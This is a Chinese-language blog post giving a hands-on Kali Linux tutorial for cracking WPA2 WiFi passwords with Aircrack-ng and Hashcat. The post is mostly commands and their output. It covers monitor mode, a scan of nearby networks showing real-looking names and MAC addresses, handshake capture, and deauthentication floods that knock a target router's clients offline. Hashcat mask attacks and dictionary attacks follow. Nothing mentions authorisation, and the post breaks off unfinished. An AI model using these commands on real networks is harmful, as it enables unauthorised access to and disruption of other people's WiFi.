---
title: Aircrack配合Hashcat暴力破解WiFi密码
date: 2020-11-01 20:33:53
cover: https://cdn.jsdelivr.net/gh/quanlook/ImgCdn/blog/202210182359249.jpg
tags:
 - kali linux
 - WiFi
 - Aircrack
 - Hashcat
categories: 
 - kali linux
 - 渗透测试
---

# WiFi密码破解

 WiFi密码破解

1. ifconfig查看你的网卡信息，wlan0即无线网卡

```sh
ifconfig
ifconfig wlan0 up
```

2. airmon-ng start wlan0(启动网卡监听模式)

```sh
airmon-ng start wlan0
```

```sh
root@kali:~# airmon-ng start wlan0
   
   Found 3 processes that could cause trouble.
   If airodump-ng, aireplay-ng or airtun-ng stops working after
   a short period of time, you may want to run 'airmon-ng check kill'
   
      PID Name
      630 NetworkManager
     1026 wpa_supplicant
     1837 dhclient
   
   PHY Interface Driver  Chipset
   
   phy0 wlan0  mt7601u  Ralink Technology, Corp. MT7601U
   
     (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
     (mac80211 station mode vif disabled for [phy0]wlan0)
   
```

3. 启动后ifconfig查看一下，如果网卡名变成了wlan0mon了

4. 扫描附近wifi

```sh
airodump-ng  wlan0mon
```

```sh
root@kali:~# airodump-ng  wlan0mon
    CH  6 ][ Elapsed: 1 min ][ 2018-12-23 19:59                                         
                                                                                                          
    BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                          
    0C:82:68:FC:9E:5E  -49       76        0    0  11  135  OPN              TP-LINK_FC9E5E               
    00:36:76:69:90:22  -55        2     2173    0   1  270  WPA2 CCMP   PSK  702训练室                    
    2E:49:3B:0A:45:3D  -70       17        0    0   1  54   OPN              and-Business                 
    36:49:3B:0A:45:3D  -70       13        0    0   1  54   WPA2 CCMP   MGT  CMCC                         
    22:49:3B:0A:45:3D  -70       13        0    0   1  54   OPN              CMCC-GX                       
    30:49:3B:0A:45:3D  -71       11        0    0   1  54   OPN              CMCC-WEB                      
    F4:83:CD:AF:41:4B  -82        7        0    0   1  405  WPA2 CCMP   PSK  TP-LINK_403                   
    68:DB:54:D7:6E:42  -86        4        0    0   4  130  WPA2 CCMP   PSK  @PHICOMM_40                   
    34:2E:B6:03:A9:80  -87       29        0    0  11  270  WPA2 CCMP   PSK  想连叫爸爸                    
    04:C1:B9:6F:37:C0  -87       35        0    0  11  130  WPA2 CCMP   PSK  ChinaNet-31E7                 
    DC:FE:18:C9:65:FA  -88       12        0    0  11  405  WPA2 CCMP   PSK  TP-LINK_65FA                  
    28:2C:B2:23:6C:7A  -88       27        0    0  11  270  WPA2 CCMP   PSK  qg2                           
    2E:15:E1:15:59:7B  -88        9        0    0  10  360  OPN              @PHICOMM_79                   
    70:AF:6A:CF:D2:A9  -88        9        0    0   1  130  WPA2 CCMP   PSK  你看不到我                    
    FC:7C:02:13:2B:2F  -89        1        2    0  11  260  WPA2 CCMP   PSK  爱尔眼科4楼                   
                                                                                                           
    BSSID              STATION            PWR   Rate    Lost    Frames  Probe                              
                                                                                                           
    (not associated)   DA:A1:19:71:F1:BA  -90    0 - 1      0        1                                     
    (not associated)   30:D1:6B:90:C0:7B  -58    0 - 1      0        1                                     
    (not associated)   9C:4E:36:48:61:E4  -66    0 - 1      0        3                                     
    (not associated)   00:08:22:CE:F9:FB  -88    0 - 1      0        1                                     
    (not associated)   9C:50:EE:32:C0:2D  -88    0 - 1      0        2  HuaweiAdminWDS                     
    (not associated)   DA:A1:19:0F:81:F1  -90    0 - 1      0        1                                     
    (not associated)   9C:50:EE:49:95:6D  -90    0 - 1      0        1  HuaweiAdminWDS                     
    00:36:76:69:90:22  74:70:FD:E2:8E:3E  -36    0 - 6e     0        7                                     
    00:36:76:69:90:22  88:F7:BF:5F:6A:85  -56    0 - 1e    10        3                                     
    00:36:76:69:90:22  74:AC:5F:F4:F0:4E  -66    0e- 1e    19     2177      
```

> 参数详解:
> BSSID: MAC地址
> PWR:信号强度，越小信号越强。
> Data:传输的数据, 数据越大对我们越有利, 大的夸张的可能在看电影
> CH:信号频道
> ESSID:wifi名称

抓包开始

(比如我要抓的是这个)

```sh
airodump-ng -c 11 --bssid 2E:E9:D3:28:59:EB -w /home/chenglee/2018/ wlan0mon
```

> PS:
> -c代表频道, 后面带的是频道
> bssid: mac地址(物理地址)
> -w代表目录(抓到的握手包放在这个目录下面)
> wlan0mon: 网卡名称

一直跑吖跑, 它的数据是不停刷新变化的...

这时候应该做点什么了,利用deauth洪水攻击，取消目标路由和所有设备的无线连接，这时候设备重新连接时，会抓取他的握手包，然后用字典进行爆破.

新开一个窗口观察

**如果无法获取包，攻击路由器进行断网重新连接**

输入：

```sh
aireplay-ng -0 0 -a 2E:E9:D3:28:59:EB  wlan0mon
aireplay-ng -0 2 -a 46:99:66:F9:84 -c B8:E8:56:09:CC:9C wlan0mon
aireplay-ng --deauth 90 -a B4:DE:DF:66:0B:10  wlan0mon
```

> -a ：路由器MAC
> -c ：客户端mac 地址

这时候目标路由已经断网，如果抓到包记得ctrl+c关掉这里，否则一直断网就成恶作剧了。这时返回你抓包的那个窗口，如果右上角出现handshake这样的信息(看下图)，这说明抓包已经成功。

破解输入：

```sh
#可以看到这里已经成功识别出了目标无线id
wpaclean output.cap inpout.cap

#把数据包转换成hashcat能认识的hash类型
aircrack-ng input.cap -J wpahash
root@kali:~/WiFi# aircrack-ng FAST_7EBF.cap -J FAST_7EBF-wpahash

hashcat -m 2500 -a 3 wpahash.hccap ?u?l?l?l?l?d?d?d

aircrack-ng -w wpa.txt xxnet.cap

aircrack-ng -w /home/chenglee/dictionary/wpa.txt /home/chenglee/2018/-01.cap
```

> PS:
> -w ：指定密码字典
> -01.cap：握手包
> 也许过程会有点长, 这个得看密码复杂的与字典的好坏。

# Hashcat暴力破解密码

**内容持续更新中….**
